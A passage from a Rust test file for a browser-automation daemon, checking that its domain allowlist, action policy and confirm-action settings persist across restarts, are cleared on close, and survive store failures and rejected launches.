            saves: AtomicUsize::new(0),
            fail_from,
        })
    }

    fn counting() -> Arc<FlakyStore> {
        FlakyStore::new(usize::MAX)
    }

    fn saves(&self) -> usize {
        self.saves.load(Ordering::SeqCst)
    }
}

impl Store for FlakyStore {
    fn load(&self) -> Result<Option<SecurityView>, StoreError> {
        self.inner.load()
    }

    fn save(&self, view: &SecurityView) -> Result<(), StoreError> {
        let attempt = self.saves.fetch_add(1, Ordering::SeqCst);
        if attempt >= self.fail_from {
            return Err(StoreError::PersistFailed("disk full".to_string()));
        }
        self.inner.save(view)
    }

    fn clear(&self) -> Result<(), StoreError> {
        self.inner.clear()
    }
}

fn write_private(path: &std::path::Path, contents: &str) {
    fs::write(path, contents).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(path, fs::Permissions::from_mode(0o600)).unwrap();
    }
}

/// A daemon start for `session`: the settings come from `store`, as in
/// `run_daemon`.
fn boot_state(store: Arc<dyn Store>, session: &str) -> DaemonState {
    let settings = Running::boot(store.as_ref(), session).unwrap();
    DaemonState::with_store(settings, store)
}

fn domains(list: &[&str]) -> (Key, Requested) {
    set_to(Key::AllowedDomains, json!(list))
}

fn security_patch(policy_path: &str) -> Patch {
    patch_with(vec![
        domains(&["example.com"]),
        set_to(Key::ActionPolicy, json!(policy_path)),
        set_to(Key::ConfirmActions, json!("navigate,click")),
    ])
}

#[tokio::test]
async fn test_a_stored_empty_domain_list_restores_as_no_filter() {
    let (_env, _) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    write_private(&dir.path().join("s.settings"), r#"{"allowedDomains":[]}"#);
    let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));

    let state = boot_state(store, "s");

    assert!(state.domain_filter.read().await.is_none());
}

#[tokio::test]
async fn test_a_respawned_daemon_keeps_the_filter_policy_and_confirm_categories() {
    let (_env, _) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    let policy = dir.path().join("policy.json");
    fs::write(&policy, r#"{"default":"deny"}"#).unwrap();
    let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
    let mut first = DaemonState::with_store(Running::defaults(), store.clone());
    let patch = security_patch(policy.to_str().unwrap());
    apply_settings_patch(&mut first, &patch, true)
        .await
        .unwrap();
    drop(first);

    // A new process over the same files, with no flags and an empty env.
    let second = boot_state(store.clone(), "s");

    assert_eq!(current_allowed_domains(&second).await, vec!["example.com"]);
    assert!(second.policy.is_some(), "the action policy is back");
    assert!(
        second.confirm_actions.is_some(),
        "the confirm categories are back"
    );
    assert_eq!(
        second.settings.security().action_policy_path.as_deref(),
        policy.to_str(),
        "the policy path is kept as given"
    );
}

#[tokio::test]
async fn test_a_respawned_daemon_still_rejects_state_while_the_filter_is_active() {
    let (_env, _) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
    let mut first = DaemonState::with_store(Running::defaults(), store.clone());
    apply_settings_patch(
        &mut first,
        &patch_with(vec![domains(&["example.com"])]),
        true,
    )
    .await
    .unwrap();
    drop(first);

    let mut second = boot_state(store, "s");

    let replay = ensure_state_replay_supported_by_active_domain_filter(&second, "state load")
        .await
        .unwrap_err();
    assert!(
        replay.contains("--allowed-domains is not supported"),
        "{replay}"
    );
    let launch = json!({ "action": "launch", "storageState": "/tmp/s.json" });
    let err = handle_launch(&launch, &mut second).await.unwrap_err();
    assert!(
        err.contains("--allowed-domains is not supported with --state"),
        "{err}"
    );
}

#[tokio::test]
async fn test_a_restart_without_close_keeps_the_stored_settings() {
    let (_env, _) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
    let mut first = boot_state(store.clone(), "s");
    apply_settings_patch(
        &mut first,
        &patch_with(vec![domains(&["example.com"])]),
        true,
    )
    .await
    .unwrap();

    // Idle expiry, a crash and a kill all end the process without `close`.
    drop(first);
    drop(boot_state(store.clone(), "s"));
    let third = boot_state(store.clone(), "s");

    assert_eq!(current_allowed_domains(&third).await, vec!["example.com"]);
    assert!(dir.path().join("s.settings").exists());
}

#[tokio::test]
async fn test_close_clears_the_stored_settings() {
    let (_env, _) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
    let mut first = boot_state(store.clone(), "s");
    apply_settings_patch(
        &mut first,
        &patch_with(vec![domains(&["example.com"])]),
        true,
    )
    .await
    .unwrap();
    assert!(dir.path().join("s.settings").exists());

    let reply = handle_close(&mut first).await.unwrap();

    assert_eq!(reply["closed"], true, "{reply}");
    assert!(reply.get("settingsClearError").is_none(), "{reply}");
    assert!(!dir.path().join("s.settings").exists());
    let next = boot_state(store, "s");
    assert!(next.domain_filter.read().await.is_none());
}

#[tokio::test]
async fn test_the_internal_shutdown_of_a_restart_keeps_the_stored_settings() {
    let (_env, _) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
    let mut first = boot_state(store.clone(), "s");
    apply_settings_patch(
        &mut first,
        &patch_with(vec![domains(&["example.com"])]),
        true,
    )
    .await
    .unwrap();

    // What ensure_daemon sends before it starts a replacement daemon.
    let resp = execute_command(
        &json!({ "id": "restart-close", "action": INTERNAL_DAEMON_SHUTDOWN_ACTION }),
        &mut first,
    )
    .await;

    assert_eq!(resp["success"], true, "{resp}");
    assert!(dir.path().join("s.settings").exists());
    let next = boot_state(store, "s");
    assert_eq!(current_allowed_domains(&next).await, vec!["example.com"]);
}

/// A state holding an allowlist and a policy file with `policy`.
async fn contained_state_with_policy(
    dir: &std::path::Path,
    policy: &str,
) -> (DaemonState, Arc<dyn Store>) {
    let file = dir.join("policy.json");
    fs::write(&file, policy).unwrap();
    let store: Arc<dyn Store> = Arc::new(FsStore::new(dir, "s"));
    let mut state = boot_state(store.clone(), "s");
    let patch = patch_with(vec![
        domains(&["example.com"]),
        set_to(Key::ActionPolicy, json!(file.to_str().unwrap())),
    ]);
    apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();
    (state, store)
}

#[tokio::test]
async fn test_a_close_denied_by_policy_keeps_the_stored_settings() {
    let (_env, _) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    let (mut state, _) = contained_state_with_policy(dir.path(), r#"{"deny":["close"]}"#).await;

    let resp = execute_command(&json!({ "id": "1", "action": "close" }), &mut state).await;

    assert_eq!(resp["success"], false, "{resp}");
    assert!(dir.path().join("s.settings").exists());
}

#[tokio::test]
async fn test_a_close_parked_for_confirmation_keeps_the_settings_until_confirmed() {
    let (_env, _) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    let (mut state, _) = contained_state_with_policy(dir.path(), r#"{"confirm":["close"]}"#).await;

    let parked = execute_command(&json!({ "id": "1", "action": "close" }), &mut state).await;
    assert_eq!(parked["data"]["confirmation_required"], true, "{parked}");
    assert!(dir.path().join("s.settings").exists());

    let confirmed = execute_command(&json!({ "id": "2", "action": "confirm" }), &mut state).await;
    assert_eq!(confirmed["success"], true, "{confirmed}");
    assert!(!dir.path().join("s.settings").exists());
}

#[tokio::test]
async fn test_close_clears_a_file_the_daemon_could_not_read() {
    let (_env, _) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
    write_private(&dir.path().join("s.settings"), "{not json");
    assert!(Running::boot(store.as_ref(), "s").is_err());
    let mut state = DaemonState::with_store(Running::defaults(), store.clone());

    handle_close(&mut state).await.unwrap();

    assert!(Running::boot(store.as_ref(), "s").is_ok());
}

#[tokio::test]
async fn test_an_unchanged_value_does_not_write() {
    let (_env, _) = isolated_state();
    let store = FlakyStore::counting();
    let mut state = DaemonState::with_store(Running::defaults(), store.clone());
    let patch = patch_with(vec![domains(&["example.com"])]);

    apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();
    assert_eq!(store.saves(), 1);
    apply_settings_patch(&mut state, &patch, true)
        .await
        .unwrap();
    apply_settings_patch(&mut state, &Patch::default(), true)
        .await
        .unwrap();
    let other = patch_with(vec![set_to(Key::UserAgent, json!("ua"))]);
    apply_settings_patch(&mut state, &other, true)
        .await
        .unwrap();

    assert_eq!(store.saves(), 1, "only the first change was written");
}

#[tokio::test]
async fn test_a_launch_rejected_for_containment_restores_the_stored_value() {
    let (_env, _) = isolated_state();
    let store = FlakyStore::counting();
    let mut state = DaemonState::with_store(Running::defaults(), store.clone());
    apply_settings_patch(&mut state, &patch_with(vec![domains(&["a.com"])]), true)
        .await
        .unwrap();
    let cmd = json!({
        "action": "launch",
        "cdpUrl": "ws://127.0.0.1:9222/devtools/browser/test",
        "allowedDomains": ["b.com"]
    });

    assert!(handle_launch(&cmd, &mut state).await.is_err());

    assert_eq!(current_allowed_domains(&state).await, vec!["a.com"]);
    let stored = store.load().unwrap().unwrap();
    assert_eq!(stored.allowed_domains, Some(vec!["a.com".to_string()]));
}

#[tokio::test]
async fn test_a_failed_launch_that_is_not_a_rejection_keeps_the_new_stored_value() {
    let (_env, _) = isolated_state();
    let store = FlakyStore::counting();
    let mut state = DaemonState::with_store(Running::defaults(), store.clone());
    let cmd = json!({
        "action": "launch",
        "executablePath": "/nonexistent/chrome",
        "allowedDomains": ["example.com"]
    });

    assert!(handle_launch(&cmd, &mut state).await.is_err());

    let stored = store.load().unwrap().unwrap();
    assert_eq!(
        stored.allowed_domains,
        Some(vec!["example.com".to_string()])
    );
}

#[tokio::test]
async fn test_a_rejection_reports_a_stored_value_that_could_not_be_restored() {
    let (_env, _) = isolated_state();
    let store = FlakyStore::new(2);
    let mut state = DaemonState::with_store(Running::defaults(), store.clone());
    apply_settings_patch(&mut state, &patch_with(vec![domains(&["a.com"])]), true)
        .await
        .unwrap();
    let cmd = json!({
        "action": "launch",
        "cdpUrl": "ws://127.0.0.1:9222/devtools/browser/test",
        "allowedDomains": ["b.com"]
    });

    let err = handle_launch(&cmd, &mut state).await.unwrap_err();

    // Save 0 (a.com) and save 1 (b.com) succeed; the restore (save 2) fails.
    assert!(
        err.contains("the stored security settings could not be restored")
            && err.contains("disk full"),
        "{err}"
    );
    assert_eq!(store.saves(), 3, "the restore was attempted");
    assert_eq!(current_allowed_domains(&state).await, vec!["a.com"]);
}

#[tokio::test]
async fn test_an_empty_list_clears_the_filter_and_the_clear_persists() {
    let (_env, _) = isolated_state();
    let dir = tempfile::tempdir().unwrap();
    let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
    let mut first = boot_state(store.clone(), "s");
    apply_settings_patch(
        &mut first,
        &patch_with(vec![domains(&["example.com"])]),
        true,
    )
    .await
    .unwrap();

    apply_settings_patch(&mut first, &patch_with(vec![domains(&[])]), true)
        .await
        .unwrap();
    assert!(first.domain_filter.read().await.is_none());
    drop(first);

    let second = boot_state(store, "s");
    assert!(current_allowed_domains(&second).await.is_empty());
    assert_eq!(second.settings.security().allowed_domains, Some(Vec::new()));
}

#[tokio::test]
async fn test_a_failing_store_leaves_the_session_untouched() {
    let (_env, _) = isolated_state();
    let store = FlakyStore::new(0);
    let mut state = DaemonState::with_store(Running::defaults(), store.clone());
    let before = state.settings.clone();

    let err = apply_settings_patch(&mut state, &security_patch("/p.json"), true)
        .await
        .err()
        .expect("the write fails");

    assert!(err.contains("disk full"), "{err}");
    assert!(state.domain_filter.read().await.is_none());
    assert!(state.policy.is_none());
    assert!(state.confirm_actions.is_none());
    assert_eq!(state.settings, before);
    assert_eq!(store.load().unwrap(), None);
}

#[tokio::test]
async fn test_a_failing_store_fails_the_command_before_it_runs() {
    let (_env, _) = isolated_state();
    let mut state = DaemonState::with_store(Running::defaults(), FlakyStore::new(0));
    let cmd = json!({
        "id": "1",
        "action": "navigate",
        "url": "about:blank",
        "settings": { "allowed-domains": ["example.com"] }
    });

    let resp = execute_command(&cmd, &mut state).await;

    assert_eq!(resp["success"], false, "{resp}");
    assert!(
        resp["error"].as_str().unwrap().contains("disk full"),
        "{resp}"
    );
    assert!(state.domain_filter.read().await.is_none());
}

#[tokio::test]
async fn test_stores_in_other_namespaces_do_not_leak_settings() {
    let (_env, _) = isolated_state();
    let one = tempfile::tempdir().unwrap();
    let other = tempfile::tempdir().unwrap();
    let store: Arc<dyn Store> = Arc::new(FsStore::new(one.path(), "s"));
    let mut state = boot_state(store, "s");
    apply_settings_patch(
        &mut state,
        &patch_with(vec![domains(&["example.com"])]),
        true,
    )
    .await
    .unwrap();

    let elsewhere = boot_state(Arc::new(FsStore::new(other.path(), "s")), "s");
    let sibling = boot_state(Arc::new(FsStore::new(one.path(), "t")), "t");

    assert!(elsewhere.domain_filter.read().await.is_none());
    assert!(sibling.domain_filter.read().await.is_none());
}
